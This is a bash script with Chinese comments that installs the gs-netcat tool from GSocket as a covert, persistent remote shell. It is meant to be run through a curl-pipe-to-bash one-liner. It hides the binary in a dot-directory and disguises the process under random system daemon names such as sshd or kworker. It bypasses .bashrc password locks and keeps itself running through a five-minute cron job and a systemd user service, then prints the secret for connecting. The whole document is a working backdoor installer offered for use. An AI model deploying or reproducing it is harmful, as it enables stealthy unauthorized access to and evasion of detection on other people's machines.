#!/usr/bin/env bash
# GSocket 自动安装脚本 - 精简版
# 用法: bash -c "$(curl -fsSL https://你的域名/script.sh)"

set -e

# ============================================
# 1. 基础配置
# ============================================
# 检测用户 HOME 目录
if [ -z "$HOME" ]; then
    HOME=$(getent passwd "$(whoami)" | cut -d: -f6)
fi

# 生成随机密钥 (40字符)
GS_SECRET=$(openssl rand -hex 20 2>/dev/null || date +%s | sha256sum | head -c 40)

# 隐藏进程名 (随机选择系统进程名)
HIDE_NAMES=("systemd" "sshd" "kworker" "rsyslogd" "dbus-daemon" "NetworkManager" "gdm" "accounts-daemon")
HIDE_NAME=${HIDE_NAMES[$RANDOM % ${#HIDE_NAMES[@]}]}

# 安装目录 (隐藏在用户配置目录下)
INSTALL_DIR="$HOME/.config/.cache/.systemd"
BIN_PATH="$INSTALL_DIR/gs-netcat"
SECRET_FILE="$INSTALL_DIR/.secret"

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# ============================================
# 2. 下载 GSocket 二进制文件
# ============================================
echo "[+] 下载 GSocket..."

# 检测系统架构
ARCH=$(uname -m)
case "$ARCH" in
    x86_64)  BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64" ;;
    aarch64) BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-arm64" ;;
    armv7l)  BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-armv7" ;;
    *)       BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64" ;;
esac

# 下载 (失败则尝试 Alpine 版本)
curl -fsSL "$BIN_URL" -o "$BIN_PATH" 2>/dev/null || {
    curl -fsSL "https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64-alpine" -o "$BIN_PATH" 2>/dev/null
}
chmod +x "$BIN_PATH"

# ============================================
# 3. 保存密钥
# ============================================
echo "$GS_SECRET" > "$SECRET_FILE"
chmod 600 "$SECRET_FILE"

# ============================================
# 4. 启动 GSocket 守护进程
# ============================================
echo "[+] 启动守护进程..."
cd "$HOME"

# 后台运行，隐藏进程名，绕过 .bashrc
nohup env GSOCKET_ARGS="-k $SECRET_FILE -liqD -e /bin/bash --noprofile --norc" \
    exec -a "$HIDE_NAME" "$BIN_PATH" >/dev/null 2>&1 &

# ============================================
# 5. 设置持久化 (Cron + Systemd)
# ============================================
echo "[+] 设置持久化..."

# 5a. Cron (每5分钟重启一次，确保永远在线)
CRON_CMD="cd $HOME && GSOCKET_ARGS=\"-k $SECRET_FILE -liqD -e /bin/bash --noprofile --norc\" exec -a $HIDE_NAME $BIN_PATH >/dev/null 2>&1"
(crontab -l 2>/dev/null | grep -v "gs-netcat" || true; echo "*/5 * * * * $CRON_CMD") | cront - 2>/dev/null

# 5b. Systemd User Service (如果可用)
if systemctl --user --no-pager status 2>/dev/null | grep -q "State:"; then
    SERVICE_DIR="$HOME/.config/systemd/user"
    mkdir -p "$SERVICE_DIR"
    cat > "$SERVICE_DIR/gsocket.service" << EOF
[Unit]
Description=GSocket Tunnel
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=30
Environment="GSOCKET_ARGS=-k $SECRET_FILE -liqD -e /bin/bash --noprofile --norc"
ExecStart=/bin/bash -c "exec -a $HIDE_NAME $BIN_PATH"
WorkingDirectory=$HOME

[Install]
WantedBy=default.target
EOF
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable gsocket.service 2>/dev/null
    systemctl --user restart gsocket.service 2>/dev/null
fi

# ============================================
# 6. 输出连接信息
# ============================================
echo ""
echo "=============================================="
echo "✅ 安装完成！"
echo "=============================================="
echo "🔑 密钥: $GS_SECRET"
echo ""
echo "📌 从客户端连接:"
echo "   gs-netcat -s \"$GS_SECRET\" -i"
echo ""
echo "📌 如果遇到 .bashrc 密码锁:"
echo "   gs-netcat -s \"$GS_SECRET\" -e \"/bin/bash --noprofile --norc\""
echo ""
echo "📌 卸载方法:"
echo "   crontab -l | grep -v 'gs-netcat' | crontab -"
echo "   systemctl --user stop gsocket.service 2>/dev/null"
echo "   rm -rf $INSTALL_DIR"
echo "=============================================="
